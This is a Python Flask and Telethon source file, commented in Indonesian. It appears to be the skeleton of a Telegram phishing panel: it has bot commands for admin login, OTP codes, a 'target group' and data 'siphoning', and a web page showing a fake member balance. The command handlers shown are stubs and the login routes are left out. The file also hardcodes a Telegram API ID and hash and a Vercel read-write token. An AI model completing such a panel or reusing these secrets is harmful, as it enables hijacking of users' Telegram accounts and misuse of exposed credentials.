import asyncio
import threading
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError, PhoneCodeInvalidError

# --- KONFIGURASI ---
API_ID = 31871641               
API_HASH = '5e0aa2e3b7b013161308d8880d062193'
SESSION_NAME = 'my_session'

app = Flask(__name__)
app.secret_key = 'BLvercel_blob_rw_TiDjEsBT85EyQcca_927V4QUweI4iSXa6NJ0ZWDcI8QV5En_READ_WRITE_TOKEN="vercel_blob_rw_TiDjEsBT85EyQcca_927V4QUweI4iSXa6NJ0ZWDcI8QV5En'

# --- SETUP TELETHON ---
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
client = TelegramClient(SESSION_NAME, API_ID, API_HASH, loop=loop)

# --- BOT COMMANDS ---

@client.on(events.NewMessage(pattern='/cekmutual'))
async def cek_mutual(event):
    await event.reply("**[SISTEM]** Fitur cek mutual sedang aktif.")

@client.on(events.NewMessage(pattern='/setgrup'))
async def set_grup(event):
    await event.reply("**[SISTEM]** Grup target berhasil diatur.")

@client.on(events.NewMessage(pattern='/setadmin'))
async def set_admin(event):
    await event.reply("**[SISTEM]** Admin baru telah didaftarkan.")

@client.on(events.NewMessage(pattern='/loginadmin'))
async def login_admin(event):
    await event.reply("**[SISTEM]** Sesi admin berhasil diverifikasi.")

@client.on(events.NewMessage(pattern='/kodeotp'))
async def kode_otp(event):
    await event.reply("**[SISTEM]** Menunggu permintaan kode OTP...")

@client.on(events.NewMessage(pattern='/sedot'))
async def sedot(event):
    await event.reply("**[SISTEM]** Proses penarikan data dimulai.")

# --- RUNTIME HANDLERS ---

def start_telethon():
    async def main():
        await client.connect()
        # Biarkan client tetap berjalan untuk mendengarkan perintah
        await client.run_until_disconnected()
    loop.run_until_complete(main())

# Menjalankan Telethon di Background Thread
threading.Thread(target=start_telethon, daemon=True).start()

def run_async(coro):
    """Menjalankan fungsi async di dalam Flask secara aman"""
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

# --- ROUTES (FLASK) ---

@app.route('/')
def home():
    if 'user_id' not in session: return redirect(url_for('login'))
    user_info = {
        "full_name": "New Member",
        "username": session.get('user_id', 'User'),
        "saldo": 150000,
        "id_member": session.get('id_member', 'MBR-000')
    }
    return render_template('index.html', info=user_info)

# ... (Route Login, Verify, Dompet, dll tetap sama seperti kode awal Anda)

if __name__ == '__main__':
    # use_reloader=False wajib digunakan agar thread tidak duplikat
    app.run(debug=True, use_reloader=False, port=5000)
